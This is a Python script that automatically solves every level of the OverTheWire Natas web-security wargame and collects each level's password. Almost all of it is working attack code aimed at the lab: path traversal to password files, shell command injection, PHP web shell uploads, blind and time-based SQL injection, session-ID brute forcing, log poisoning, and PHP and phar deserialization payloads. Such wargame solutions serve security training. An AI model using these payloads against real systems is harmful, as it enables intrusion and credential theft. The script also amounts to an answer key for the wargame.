#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# main solver used: https://github.com/JohnHammond/overthewire_natas_solutions
# also used: https://github.com/tiborscholtz/overthewire_natas_solutions
# final script by imol.ai

import requests, re, json, time, base64 as b64, string, subprocess, os
from pwn import *
from urllib.parse import unquote, quote

# List of collected flags
flags = ['natas0']

# ANSI color codes (used for text colors)
Green = '\x1b[32m'
White = '\x1b[37m'
Purple = '\x1b[35m'
Blue = '\x1b[36m'
D_Blue = '\x1b[34m'
Red = '\x1b[31m'
Amber = '\x1b[33m'


################## helper functions ##################

##### lv_open = create session #####
# num = int: level value to connect to
# return = session object
def lv_open(num):
	user = 'natas' + str(num)
	print(Green + f'Starting Natas Level: ' + str(num) + White)
	ses = requests.Session()
	ses.auth = (user, flags[num])
	ses.url = f"http://{user}.natas.labs.overthewire.org/"
	return ses

##### flag_print = prints flag found and add to list #####
# s = int: start of flag string junk data to remove
# e = int: end of flag string junk data to remove
def flag_print(s=0, e=None):
	strippedFlag = flag[s:-e if e else None]
	flags.append(strippedFlag)
	print(Green + 'Natas' + str(lv) + ' flag = ' + Red + flags[lv+1] + White)
	ses.close()


############### natas level functions ###############

def natas0():
	global flag, ses
	ses = lv_open(lv)
	flag = re.findall(r'<!--The password for natas1 is (.*) -->', ses.get(ses.url).text)[0]
	flag_print()

def natas1():
	global flag, ses
	ses = lv_open(lv)
	flag = re.findall(r'<!--The password for natas2 is (.*) -->', ses.get(ses.url).text)[0]
	flag_print()

def natas2():
	global flag, ses
	ses = lv_open(lv)
	flag = re.findall(r'natas3:(.*)', ses.get(ses.url+'files/users.txt').text)[0]
	flag_print()

def natas3():
	global flag, ses
	ses = lv_open(lv)
	flag = re.findall(r'natas4:(.*)', ses.get(ses.url+'s3cr3t/users.txt').text)[0]
	flag_print()

def natas4():
	global flag, ses
	ses = lv_open(lv)
	req = ses.get(ses.url, headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/" })
	flag = re.findall(r'The password for natas5 is (.*)', req.text)[0]
	flag_print()

def natas5():
	global flag, ses
	ses = lv_open(lv)
	req = ses.get(ses.url, cookies = { "loggedin" : "1" })
	flag = re.findall(r' natas6 is (.*)</div>', req.text)[0]
	flag_print()

def natas6():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url, data = {"secret": re.findall(r'\$secret = "(.+?)";', ses.get(ses.url+'includes/secret.inc').text)[0], "submit":"submit"})
	flag = re.findall(r' natas7 is (.*)', req.text)[0]
	flag_print()

def natas7():
	global flag, ses
	ses = lv_open(lv)
	req = ses.get(ses.url+'index.php?page=../../../../etc/natas_webpass/natas8')
	flag = re.findall(r'<br>\n(.*)\n\n<!--', req.text)[0]
	flag_print()

def natas8():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url, data = {"secret": b64.b64decode(bytes.fromhex(re.findall(r'\$encodedSecret = "(.+?)";', re.sub(r'</?span.*?>', '', ses.get(ses.url+'index-source.html').text.replace('&nbsp;', ' ')))[0])[::-1]), "submit":"submit" })
	flag = re.findall(r'natas9 is (.*)', req.text)[0]
	flag_print()

def natas9():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url, data = {"needle": ". /etc/natas_webpass/natas10 #", "submit":"submit" })
	flag = re.findall(r'<pre>\n(.*)\n</pre>', req.text)[0]
	flag_print()

def natas10():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url, data = {"needle": ". /etc/natas_webpass/natas11 #", "submit":"submit" })
	flag = re.findall(r'<pre>\n(.*)\n</pre>', req.text)[0]
	flag_print()

def natas11():
	global flag, ses
	ses = lv_open(lv)
	xors = xor(b'{"showpassword":"no","bgcolor":"#ffffff"}', b64.b64decode(unquote(ses.get(ses.url).cookies['data'])))
	ses.cookies.clear()
	ses.cookies["data"] = quote(b64.b64encode(xor([xors[:e] for e,i in enumerate(xors[1:],1) if xors[:e]*6 in xors][0], b'{"showpassword":"yes","bgcolor":"#ffffff"}')))
	flag = re.findall(r'The password for natas12 is (.*)<br>', ses.get(ses.url).text)[0]
	flag_print()

def natas12():
	global flag, ses
	ses = lv_open(lv)
	shell = re.findall(r'href="(upload/.+?\.php)"', ses.post(ses.url, data = {"filename": "a.php"}, files = {"uploadedfile": "<?php system($_GET['c']); ?>"}).text)[0]
	flag = ses.get(ses.url+shell+'?c=cat /etc/natas_webpass/natas13').text
	flag_print(0,1)

def natas13():
	global flag, ses
	ses = lv_open(lv)
	shell = re.findall(r'href="(upload/.+?\.php)"', ses.post(ses.url, data = {"filename": "a.php"}, files = {"uploadedfile": "GIF89a\n<?php system($_GET['c']); ?>"}).text)[0]
	flag = ses.get(ses.url+shell+'?c=cat /etc/natas_webpass/natas14').text
	flag_print(7,1)

def natas14():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url, data = { "username" : '" or true #'})
	flag = re.findall(r'Successful login! The password for natas15 is (.*)<br>', req.text)[0]
	flag_print()

def natas15():
	global flag, ses
	ses = lv_open(lv)
	flag = ''
	while len(flag) < 32:
		for c in string.ascii_letters + string.digits:
			if 'user exists' in ses.post(ses.url, data = { "username" : 'natas16" AND BINARY password LIKE "' + flag + c + '%" # ' }).text:
				flag += c
				break
	flag_print()

def natas16():
	global flag, ses
	ses = lv_open(lv)
	flag = ''
	while len(flag) < 32:
		for c in string.ascii_letters + string.digits:
			req = ses.post(ses.url, data = { "needle" : "anythings$(grep ^" + flag + c + " /etc/natas_webpass/natas17)" }).text
			if not re.findall(r'<pre>\n(.*)\n</pre>', req ):
				flag += c
				break
	flag_print()

def natas17():
	global flag, ses
	ses = lv_open(lv)
	flag = ''
	while len(flag) < 32:
		for c in string.ascii_letters + string.digits:
			start = time.time()
			ses.post(ses.url, data = {"username": 'natas18" AND BINARY password LIKE "' + flag + c +  '%" AND SLEEP(0.5) # '})
			end = time.time()
			if ( end-start > 0.5 ):
				flag += c
				break
	flag_print()

def natas18():
	global flag, ses
	ses = lv_open(lv)
	for session_id in range(1, 641):
		req = ses.get(ses.url, cookies = {"PHPSESSID": str(session_id)}).text
		if ( "You are an admin" in req ):
			flag = re.findall(r'<br><pre>Username: natas19\nPassword: (.*?)</pre>', req)[0]
			break
	flag_print()

def natas19():
	global flag, ses
	ses = lv_open(lv)
	for i in range(641):
		req = ses.get(ses.url, cookies = {"PHPSESSID" : bytes.hex(f"{i}-admin".encode())}).text
		if ( "You are an admin" in req ):
			flag = re.findall(r'<br><pre>Username: natas20\nPassword: (.*?)</pre>', req)[0]
			break
	flag_print()

def natas20():
	global flag, ses
	ses = lv_open(lv)
	ses.post(ses.url, data = {"name": "\nadmin 1"})
	flag = re.findall(r'<br><pre>Username: natas21\nPassword: (.*?)</pre>', ses.get(ses.url).text)[0]
	flag_print()

def natas21():
	global flag, ses
	ses = lv_open(lv)
	ses.post('http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1')
	ses.cookies["PHPSESSID"] = ses.cookies["PHPSESSID"] # gets rid of domain restriction
	flag = re.findall(r'<br><pre>Username: natas22\nPassword: (.*?)</pre>', ses.get(ses.url).text)[0]
	flag_print()

def natas22():
	global flag, ses
	ses = lv_open(lv)
	flag = re.findall(r'<br><pre>Username: natas23\nPassword: (.*?)</pre>', ses.get(ses.url+'?revelio=1', allow_redirects=False).text)[0]
	flag_print()

def natas23():
	global flag, ses
	ses = lv_open(lv)
	flag = re.findall(r'<br><pre>Username: natas24 Password: (.*?)</pre>', ses.get(ses.url+'?passwd=11iloveyou').text)[0]
	flag_print()

def natas24():
	global flag, ses
	ses = lv_open(lv)
	flag = re.findall(r'<br><pre>Username: natas25 Password: (.*?)</pre>', ses.get(ses.url+'?passwd[]=').text)[0]
	flag_print()

def natas25():
	global flag, ses
	ses = lv_open(lv)
	ses.get(ses.url)
	req = ses.post(ses.url, headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}, data = {"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" +  ses.cookies['PHPSESSID'] + ".log"})
	flag = re.findall(r'\n\[\d\d\.\d\d\.\d{4} \d\d::\d\d:\d\d\] (.{32})\n "Directory traversal attempt! fixing request\."\n<br />', req.text)[0]
	flag_print()

def natas26():
	global flag, ses
	ses = lv_open(lv)
	ses.cookies['drawing'] = b64.b64encode(b"""O:6:"Logger":2:{s:15:"LoggerlogFile";s:14:"img/winner.php";s:15:"LoggerinitMsg";s:50:"<?php system('cat /etc/natas_webpass/natas27'); ?>";}""").decode()
	ses.get(ses.url+ '?x1=0&y1=0&x2=500&y2=500')
	flag = ses.get(ses.url + 'img/winner.php').text.split('\n')[0]
	flag_print()

def natas27():
	global flag, ses
	ses = lv_open(lv)
	ses.post(ses.url, data = {"username" : "natas28" + " "*57+"_", "password" : ""})
	req = ses.post(ses.url, data = {"username" : "natas28" + " "*57, "password" : ""})
	flag = re.findall(r'natas28\n    \[password\] =&gt; (.{32})\n\)\n<div id="viewsource">', req.text)[0]
	flag_print()

def natas28():
	global flag, ses
	ses = lv_open(lv)
	query = unquote(ses.post(ses.url, data = {'query': f"{' '*57}'{' '*20}UNION ALL SELECT CONCAT(username,password) FROM users;#"}).url.split('?query=')[1])
	req = ses.get(ses.url + '/search.php/?query=' + quote(query[:64] + query[128:]))
	flag = re.findall(r'<h2> Whack Computer Joke Database</h2><ul><li>natas29(.{32})</li></ul>\n', req.text)[0]
	flag_print()

def natas29():
	global flag, ses
	ses = lv_open(lv)
	flag = ses.get(ses.url+"index.pl?file="+quote("|cat /etc/na*as_webpass/na*as30;")).text.split('\n')[-2]
	flag_print()

def natas30():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url, data = {"username" : "natas31", "password" : ["'a' OR 1 #", "4"]})
	flag = re.findall(r'win!<br>here is your result:<br>natas31(.{32})<div id="viewsource">', req.text)[0]
	flag_print()

def natas31():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url+"index.pl?/etc/natas_webpass/natas32", data = {"file": "ARGV"}, files = {"file": "abcde"})
	flag = re.findall(r'<table class="sortable table table-hover table-striped"><tr><th>(.{32})\n</th></tr></table>', req.text)[0]
	flag_print()

def natas32():
	global flag, ses
	ses = lv_open(lv)
	req = ses.post(ses.url+"index.pl?"+quote("./getpassword |"), data = {"file": "ARGV"}, files = {"file": "abcde"})
	flag = re.findall(r'<table class="sortable table table-hover table-striped"><tr><th>(.{32})\n</th></tr></table>', req.text)[0]
	flag_print()

def natas33():
	global flag, ses
	ses = lv_open(lv)
	ses.post(ses.url, data = {"filename": "printer.php"}, files = {"uploadedfile": '<?php echo "NATAS33 FLAG: " . shell_exec("/usr/bin/cat /etc/natas_webpass/natas34") . "END"; ?>'}).text
	with open('tmp_runner.php', 'w') as filp:
		filp.write(
			"""<?php
			class Executor{
				private $filename="printer.php";
				private $signature=true;
				private $init=false;
			}
			$phar = new Phar('tmp_runner.phar');
			$phar->startBuffering();
			$phar->addFromString('trigger.txt', 'text');
			$phar->setStub("<?php __HALT_COMPILER(); ?>");
			$phar->setMetadata(new Executor());
			$phar->stopBuffering();
			?>"""
		)
	subprocess.run("php --define phar.readonly=0 tmp_runner.php", shell=True)
	with open('tmp_runner.phar', 'rb+') as filp:
		ses.post(ses.url, data = {"filename": "tmp_runner.phar"}, files = {"uploadedfile": filp.read() }).text
	req = ses.post(ses.url, data = {"filename": "phar://tmp_runner.phar/trigger.txt"}, files = {"uploadedfile": "data"})
	flag = re.findall(r'Congratulations! Running firmware update: printer\.php <br>NATAS33 FLAG: (.{32})\nEND', req.text)[0]
	os.remove('tmp_runner.php'); os.remove('tmp_runner.phar')
	flag_print()

def natas34():
	# "Congratulations! You have reached the end... for now."
	pass


################# Runner #################
if __name__ == '__main__':
	try:
		for lv in range(0, 34):
			eval('natas'+str(lv))()
	finally:
		print(flags)

		with open("natas.json", "r") as file:
			data = json.load(file)
		for level in data:
			if len(flags) > level['id']:
				level["target"] = f"curl -u 'natas{level['id']}:{flags[level['id']]}' http://natas{level['id']}.natas.labs.overthewire.org"
			if len(flags) > level['id']+1:
				level["flag"] = flags[level['id']+1]
		with open('natas_solved.json', 'w') as filp:
			json.dump(data, filp, indent='\t')
